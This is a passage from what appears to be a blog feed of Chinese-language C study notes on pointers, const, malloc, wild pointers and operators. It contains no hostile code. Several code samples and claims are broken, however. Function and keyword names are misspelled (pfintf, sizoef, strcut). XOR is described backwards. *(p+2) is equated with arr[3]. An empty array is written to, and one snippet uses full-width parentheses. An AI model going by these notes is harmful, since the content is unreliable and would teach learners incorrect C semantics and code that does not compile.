都是让指向的值变成常量</p><p>作用是修饰数据类型的，也就是指向指针所指向的类型</p></li><li><p><code>int* const p</code>  是指针变成了常量，指针只能指一个地址</p></li></ul><ol start="2"><li><p>区分指针数组，数组指针（哪个在后面就是什么）</p><ul><li><p>指针数组</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">char</span>* p[<span class="hljs-number">3</span>]=&#123;<span class="hljs-string">&quot;chg&quot;</span>,<span class="hljs-string">&quot;zjy&quot;</span>,<span class="hljs-string">&quot;tsy&quot;</span>&#125;;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; ++i) &#123;<br>        <span class="hljs-built_in">puts</span>(p[i]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>c基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>初始指针</title>
    <link href="/2023/04/20/C/%E5%88%9D%E5%A7%8B%E6%8C%87%E9%92%88/"/>
    <url>/2023/04/20/C/%E5%88%9D%E5%A7%8B%E6%8C%87%E9%92%88/</url>
    
    <content type="html"><![CDATA[<h1 id="初始指针"><a href="#初始指针" class="headerlink" title="初始指针"></a>初始指针</h1><h2 id="what-is-指针"><a href="#what-is-指针" class="headerlink" title="what is 指针"></a>what is 指针</h2><ol><li>指针描述了数据在内存中的位置</li><li>指针也就是内存地址</li><li>一个内存单元为一个字节</li><li>指针在32位平台是4个字节，在64位平台是8个字节</li></ol><h2 id="指针的意义"><a href="#指针的意义" class="headerlink" title="指针的意义"></a>指针的意义</h2><ol><li><p>指针的类型决定了，指针解引用的权限有多大</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//例如</span><br><span class="hljs-type">char</span>*<span class="hljs-comment">//可以指1个字节</span><br><span class="hljs-type">int</span>*<span class="hljs-comment">//可以指4个字节</span><br></code></pre></td></tr></table></figure></li></ol><h2 id="取地址运算"><a href="#取地址运算" class="headerlink" title="取地址运算"></a>取地址运算</h2><ol><li><p>&amp;：取地址后的，需要用%p输出，如果用%x（16进制），则会警告</p><ul><li><p>只有明确的变量才能取他的地址</p></li><li><p>本地变量存放在堆栈的地方，内存地址由高到底</p></li></ul></li><li><p>指针变量：用于记录地址的变量 </p></li><li><p>int* p,q只将p设成指针，q只是普通变量</p></li><li><p>指针用于，函数的传址，当函数需要返回多个值时，需要用指针带回</p></li></ol><h2 id="指针与函数"><a href="#指针与函数" class="headerlink" title="指针与函数"></a>指针与函数</h2><ol><li><p>传入函数的数组，函数接收到的是函数第一个数的地址,函数中设置接受的数组时，就是设置了指针<code>数组变量是特殊的指针</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">minmax</span><span class="hljs-params">(<span class="hljs-type">int</span> arr[])</span><span class="hljs-comment">//这里</span><br>&#123;<br>    arr[<span class="hljs-number">0</span>]=<span class="hljs-number">11</span>;<br>&#125;<br><span class="hljs-comment">//上面的函数还可以设置成</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">minmax2</span><span class="hljs-params">(<span class="hljs-type">int</span>* a)</span><br>&#123;<br>    a[<span class="hljs-number">0</span>]=<span class="hljs-number">11</span>;<span class="hljs-comment">//与上面结果一致</span><br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> arr[]=&#123;&#125;;<br>    minmax(arr);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,arr[<span class="hljs-number">0</span>])<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br> <span class="hljs-comment">//结果是11，因为设置函数时，用了int arr实际上是设置了指针   </span><br></code></pre></td></tr></table></figure><ul><li>因此在使用数组作为函数变量时，有两种方法：<ul><li>int arr</li><li>int* a</li></ul></li><li>arr的地址也就是arr[0]的地址</li></ul></li><li><p>数组变量是<code>const</code>（限定的变量不允许被改变）的指针，所以不能被赋值，数组之间也不能互相赋值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//例子：</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> a[]=&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>&#125;;<br>    <span class="hljs-type">int</span> b[]=&#123;&#125;;<br>    a=b;<span class="hljs-comment">//不能这样写</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h2 id="指针与const"><a href="#指针与const" class="headerlink" title="指针与const"></a>指针与<code>const</code></h2><ol><li><p>指针可以是<code>const</code>,修饰的值也可能是<code>const</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> *p=&amp;i;<br>*p=<span class="hljs-number">25</span>;<span class="hljs-comment">//因为使用const修饰p所以不能再使用，*对i进行修改</span><br><span class="hljs-comment">//但是可以通过，直接对i进行修改</span><br></code></pre></td></tr></table></figure></li><li><p>判断被<code>const</code>的标志</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-type">int</span>* p1=&amp;i;<br><span class="hljs-type">int</span> <span class="hljs-type">const</span> *p2=&amp;i;<br><span class="hljs-comment">//第一个和第二个是一样的，const在*的前面，表示所指的东西不能被修改，const在*的后面表示指针不能被修改</span><br></code></pre></td></tr></table></figure></li><li><p><code>const</code>修饰数组表示，数组里面的每一个元素都被<code>const</code></p></li></ol><h2 id="指针的运算"><a href="#指针的运算" class="headerlink" title="指针的运算"></a>指针的运算</h2><ol><li>指针+1，增加一个指针所指的类型，同理对n也有意义，对-也有意义，减出的结果是，差n个指针所指的类型（元素个数）</li></ol>   <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> a=<span class="hljs-number">0</span>;<br><span class="hljs-type">int</span>* p=&amp;a;<br>pfintf(<span class="hljs-string">&quot;p=%d&quot;</span>,p);<br>pfintf(<span class="hljs-string">&quot;p+1=%d&quot;</span>,p+<span class="hljs-number">1</span>);<span class="hljs-comment">//p+1为p+4,因为p增加了一个int 的大小</span><br><span class="hljs-type">char</span> b=<span class="hljs-number">0</span>;<br><span class="hljs-type">char</span>*q=&amp;b;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;q=%d&quot;</span>,q);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;q+1=%d&quot;</span>,q+<span class="hljs-number">1</span>);<span class="hljs-comment">//q+1为q+1,因为q增加了一个char的大小</span><br></code></pre></td></tr></table></figure>   <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">char</span> ac[]=&#123;<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">45</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>&#125;;<br><span class="hljs-type">char</span> *p=ac;<br><span class="hljs-comment">//*p-&gt;ac[0]</span><br><span class="hljs-comment">//*(p+1)-&gt;ac[1]</span><br></code></pre></td></tr></table></figure><ol start="2"><li>如果地址加1就没有实际意义</li><li>0地址， 是不能随便触碰的地址如果使用NULL效果和0地址一样，有些编译器，若果强制使用0地址，则可以用NULL </li><li>指针和指针相减的前提是两个指针指向同一个指针</li><li>指针加指针没有什么意义</li></ol><h2 id="指针的类型转换"><a href="#指针的类型转换" class="headerlink" title="指针的类型转换"></a>指针的类型转换</h2><ol><li>强制类型转换，可以用于指针的赋值</li></ol><h2 id="指针的用处需要传入较大的数据用作参数"><a href="#指针的用处需要传入较大的数据用作参数" class="headerlink" title="指针的用处需要传入较大的数据用作参数"></a>指针的用处需要传入较大的数据用作参数</h2><ol><li><p>传入数组对数组操作</p></li><li><p>函数返回不止一个结果</p></li><li><p>用函数修改不止一个变量</p></li><li><p>动态申请内存</p></li></ol><h2 id="动态内存分布"><a href="#动态内存分布" class="headerlink" title="动态内存分布"></a>动态内存分布</h2><ol><li><p><code>malloc</code>:库函数为<code>&lt;stdlib.h&gt;</code></p><ul><li><p>向<code>malloc</code>申请的空间的大小是以字节为单位的，返回的结果是<code>void*</code>,需要类型转换为自己需要的类型</p></li><li><p>同时需要使用，<code>free（）</code>将地址归还，括号里面填存储地址的变量，可以使用free(NULL)</p></li><li><p>如果申请失败的话就会返回0或者NULL</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> number;<br>    <span class="hljs-type">int</span>* a;<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;输入空间大小&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;number);<br>    a=(<span class="hljs-type">int</span>*)<span class="hljs-built_in">malloc</span>(number*<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>    <span class="hljs-comment">//第一个int*是将malloc返回值强制转换为int*,因为a是int*</span><br>    <span class="hljs-comment">//(number*sizeof(int)),*指的是乘法,number,是我们想要的大小,但是需要×相应的类型才能得到,</span><br>    <span class="hljs-built_in">free</span>(a);<span class="hljs-comment">//使用malloc需要归还</span><br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li><li><p>使用<code>malloc</code>常见问题</p><ul><li>使用了<code>malloc</code>没有free</li><li>错过了free的时机</li><li><code>free</code>再<code>free</code></li></ul></li></ol><h2 id="野指针"><a href="#野指针" class="headerlink" title="野指针"></a>野指针</h2><ol><li><p>指针指向的位置是不可知的为野指针</p></li><li><p>造成原因</p><ul><li><p>指针没有初始化</p><ul><li>指针的初始化为NULL</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> *i;<br>*i=<span class="hljs-number">20</span>;<br><span class="hljs-comment">//这里i 就是野指针</span><br><span class="hljs-comment">//因为i没有初始化，局部变量i默认为随机值，随机的位置来访问i,也就是非法访问</span><br><br></code></pre></td></tr></table></figure></li><li><p>指针越界也会造成野指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> arr[<span class="hljs-number">10</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">int</span>* p =arr;<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;=<span class="hljs-number">10</span>;i++)<br>    &#123;<br>        *p=i;<br>        p++;<span class="hljs-comment">//这里需要循环10次，但是第10次的时候已经越界，这时候是野指针</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>指针指向的空间释放</p></li></ul></li><li><p>如何有效规避野指针</p><ul><li>指针初始化NULL</li><li>小心指针的越界</li><li>指针指向空间及时释放指针为NULL</li><li>检查指针的有效性</li></ul></li><li><p>空指针没有权限使用</p><ul><li><p>使用指针时，最好判断是否为NULL</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> *p=<span class="hljs-literal">NULL</span>;<br><br><span class="hljs-keyword">if</span>（p!=<span class="hljs-literal">NULL</span>）<br>&#123;<br>    *p=<span class="hljs-number">20</span>;<br>&#125;<span class="hljs-comment">//最好判断一下，可以减少代码出错</span><br></code></pre></td></tr></table></figure></li></ul></li></ol><h2 id="指针的标准"><a href="#指针的标准" class="headerlink" title="指针的标准:"></a>指针的标准:</h2><blockquote><p>允许指向数组元素的指针指向数组后面一个地址，不允许指向前面一个地址</p></blockquote><ol><li><p>例如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> count 5</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">int</span> arr[count]=&#123;<span class="hljs-number">0</span>&#125;;<br><span class="hljs-type">int</span> *p=<span class="hljs-literal">NULL</span>;<br><span class="hljs-type">int</span> i=count;<br><span class="hljs-keyword">for</span>(p=&amp;arr[count];p&gt;&amp;arr[<span class="hljs-number">0</span>];)<br>&#123;<br>--i;<br>*--p=i;<br>        <span class="hljs-comment">//先--，再解引用</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d,%d\n&quot;</span>,arr[i],*p);<br>        <br>  &#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h2 id="指针和数组"><a href="#指针和数组" class="headerlink" title="指针和数组"></a>指针和数组</h2><ol><li><p>数组名：是数组首元素的地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> arr[<span class="hljs-number">10</span>];<br><span class="hljs-type">int</span> *p=arr;<br><span class="hljs-comment">//*(p+2)&lt;==&gt;arr[3]&lt;==&gt;*(2+p)&lt;==&gt;*(2+arr)&lt;==&gt;*(arr+2)&lt;==&gt;2[arr]&lt;==&gt;p[2]</span><br><span class="hljs-comment">//因为编译器在编译的时候，将arr[2]--&gt;*（arr+2）,所以我们可以运用交换率，arr[2]=2[arr]</span><br></code></pre></td></tr></table></figure></li></ol><h2 id="二级指针"><a href="#二级指针" class="headerlink" title="二级指针"></a>二级指针</h2><ol><li><p>指向指针的指针，被称作为二级指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> a=<span class="hljs-number">8</span>;<br><span class="hljs-comment">//int为a的类型</span><br><span class="hljs-type">int</span> *pa=&amp;a;<br><span class="hljs-comment">//*为指针变量，int 为a的类型</span><br><span class="hljs-type">int</span>* *ppa=&amp;pa;<span class="hljs-comment">//ppa是二级指针变量</span><br><span class="hljs-comment">//第二个*为指针变量，第一个int*为pa的类型</span><br>inte***pppa=&amp;ppa;<br><span class="hljs-comment">//三级指针</span><br></code></pre></td></tr></table></figure></li><li><p>使用：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">*pa=a;<br>*ppa=pa;<br>**ppa=a;<br></code></pre></td></tr></table></figure></li></ol><h2 id="指针数组"><a href="#指针数组" class="headerlink" title="指针数组"></a>指针数组</h2><ol><li><p>存放指针的数组</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span>* parr[<span class="hljs-number">10</span>];<span class="hljs-comment">//指针数组，cun&#x27;f</span><br></code></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>c基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>操作符详解</title>
    <link href="/2023/04/20/C/%E6%93%8D%E4%BD%9C%E7%AC%A6%E8%AF%A6%E8%A7%A31/"/>
    <url>/2023/04/20/C/%E6%93%8D%E4%BD%9C%E7%AC%A6%E8%AF%A6%E8%A7%A31/</url>
    
    <content type="html"><![CDATA[<h1 id="操作符详解"><a href="#操作符详解" class="headerlink" title="操作符详解"></a>操作符详解</h1><h2 id="算术操作符"><a href="#算术操作符" class="headerlink" title="算术操作符"></a>算术操作符</h2><ol><li>+,-,*,&#x2F;</li><li>除法（-）:得到商，如果结果是小数，int类型只会打印整形，解决方法：<ul><li>将商类型转化</li><li>直接将变量定义为double</li></ul></li><li>余数（%）：只用于整数</li></ol><h2 id="移位操作符"><a href="#移位操作符" class="headerlink" title="移位操作符"></a>移位操作符</h2><ol><li>&gt;&gt;和&lt;&lt;左移操作符</li><li>右移两种移法<ul><li>算术右移：右边丢弃一位（存储的二进制），然后左边增加符号位(当前主要)</li><li>逻辑右移：右边丢弃，左边补0</li></ul></li><li>例子：<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">int</span> a =<span class="hljs-number">16</span>;<br><span class="hljs-type">int</span> b=a&gt;&gt;<span class="hljs-number">1</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,b);<br><span class="hljs-comment">//结果是8（2^3）</span><br><span class="hljs-comment">//因为16的二进制是（32位）</span><br><span class="hljs-comment">//0（27位）10（4位）</span><br><span class="hljs-comment">//丢弃一位10（27位）10（3位）</span><br><span class="hljs-comment">//右移一位有除2二的效果</span><br></code></pre></td></tr></table></figure></li><li>补充知识：<ul><li>原码，反码，补码</li><li>整数的3码相同。负数的反码为：符号位不变，其他位按位取反。补码：负数的存储格式，为反码加1</li></ul></li><li>左移：左边丢弃，右边补零</li></ol><h2 id="位操作符"><a href="#位操作符" class="headerlink" title="位操作符"></a>位操作符</h2><ol><li>&amp;（按位与），|按位与，</li><li>&amp;只要有0，则为0，两个1，才为<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">int</span> a=<span class="hljs-number">3</span>;<br><span class="hljs-type">int</span> b=<span class="hljs-number">5</span>;<br><span class="hljs-type">int</span> c=a&amp;b;<br><span class="hljs-comment">//a在计算机中为00000000000000000000000000000011</span><br><span class="hljs-comment">//b在计算机中为00000000000000000000000000000101</span><br><span class="hljs-comment">//按位与：     00000000000000000000000000000001</span><br><span class="hljs-comment">//切记是补码进行按位与</span><br></code></pre></td></tr></table></figure></li><li>| 按位或：补码，有1则为1</li><li>^按位异或：2进制补码，相同为1，相异为0</li><li>实现两数的交换<ul><li>倒水法（创建临时变量）</li><li>加减法（值大了，容易溢出）</li><li>^法（除了代码难读，没有缺点）</li></ul></li></ol><h2 id="赋值操作符"><a href="#赋值操作符" class="headerlink" title="赋值操作符"></a>赋值操作符</h2><ol><li>连续赋值<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">x=y=z=<span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure></li><li>判断为&#x3D;&#x3D;</li><li>复合操作符：<ul><li>+&#x3D;，-&#x3D;等等</li></ul></li></ol><h2 id="单目操作符"><a href="#单目操作符" class="headerlink" title="单目操作符"></a>单目操作符</h2><ol><li>！：把假变成真，把真变成假  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">//a为真打印</span><br><span class="hljs-keyword">if</span>(a)<br>&#123;<br> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,a);<br>&#125;<br><span class="hljs-comment">//a为假打印</span><br><span class="hljs-keyword">if</span>(!a)<br>&#123;<br> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,a);<br>&#125;<br></code></pre></td></tr></table></figure></li><li>&amp;(取地址):配合指针<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">int</span> a=<span class="hljs-number">10</span>;<br><span class="hljs-type">int</span>* p=&amp;a;<br>*p=<span class="hljs-number">20</span>;<span class="hljs-comment">//让a等于20</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure></li><li>sizoef:计算所占空间的大小，单位是字节，注意区分，strlen(数组的长度，不包括‘\0’);<ul><li>指针大小，要不是4（32位系统）个字节，要不是8（64位字节）个字节</li><li>内部表的式不参加运算<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">short</span> s=<span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> a=<span class="hljs-number">10</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,<span class="hljs-built_in">sizoef</span>(s=a+<span class="hljs-number">5</span>));<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,s);<br><span class="hljs-comment">//结果为2和0，因为不参与运算</span><br></code></pre></td></tr></table></figure></li></ul></li><li>~（按位(二进制)取反）：将二进制按位取反，所有位按位取反</li><li>++a:先++，后使用</li><li>a++:先使用，再++<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">int</span> a=<span class="hljs-number">0</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,a++);<br><span class="hljs-comment">//结果位0；</span><br></code></pre></td></tr></table></figure></li><li>(类型)：强制类型转换</li></ol><h2 id="逻辑操作符"><a href="#逻辑操作符" class="headerlink" title="逻辑操作符"></a>逻辑操作符</h2><ol><li>&amp;&amp;（逻辑与）并且；<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">int</span> a=<span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> b=<span class="hljs-number">20</span>;<br><span class="hljs-type">int</span> c=a&amp;&amp;b;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,c);<br><span class="hljs-comment">//结果为1，因为a,b都为真</span><br></code></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">int</span> i=<span class="hljs-number">0</span>,a=<span class="hljs-number">0</span>,b=<span class="hljs-number">2</span>,c=<span class="hljs-number">3</span>,d=<span class="hljs-number">4</span>;<br>i=a++ &amp;&amp; ++b &amp;&amp; d++;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d,%d,%d,%d&quot;</span>,a,b,c,d);<br><span class="hljs-comment">//结果为i=0,a=1,b=2,c=3,d=4;</span><br><span class="hljs-comment">//因为先使用a,a=0,为假，后面不计算</span><br></code></pre></td></tr></table></figure></li><li>&amp;&amp;,||：对于&amp;&amp;来说只要前面是假，后面不算，对于||来说只要前面是真，就不算</li></ol><h2 id="条件操作符"><a href="#条件操作符" class="headerlink" title="条件操作符"></a>条件操作符</h2><ol><li><p>exp1?exp2:exp3:如果表达式一位真，则表达式二计算，且为整个表达式的结果，反之是表达式3</p></li><li><p>，（逗号表达式）：简便代码</p></li></ol><h2 id="下标引用操作符"><a href="#下标引用操作符" class="headerlink" title="下标引用操作符"></a>下标引用操作符</h2><ol><li>[]:常用于数组</li></ol><h2 id="函数调用操作符"><a href="#函数调用操作符" class="headerlink" title="函数调用操作符"></a>函数调用操作符</h2><ol><li>()：用于函数</li></ol><h2 id="访问一个结构的成员"><a href="#访问一个结构的成员" class="headerlink" title="访问一个结构的成员"></a>访问一个结构的成员</h2><ol><li><p>struct: 创建一个结构体</p></li><li><p>.成员名</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-comment">//相当于盖房子时的规划图,name,age,id为成员</span><br>strcut stu<br>&#123;<br>    <span class="hljs-type">char</span> name[<span class="hljs-number">10</span>];<br>    <span class="hljs-type">int</span> age;<br>    <span class="hljs-type">char</span> id[<span class="hljs-number">20</span>]<br>&#125;;<span class="hljs-comment">//注意分号</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    strcut stu s1=&#123;<span class="hljs-string">&quot;chg&quot;</span>,<span class="hljs-number">20</span>,<span class="hljs-string">&quot;2022124032&quot;</span>&#125;;<span class="hljs-comment">//往规划图里面加东西</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stu</span>* <span class="hljs-title">ps</span>=</span>&amp;s1;<span class="hljs-comment">//得到s1的地址</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>,si.name);<span class="hljs-comment">//1</span><br>    <span class="hljs-built_in">printf</span>(<span 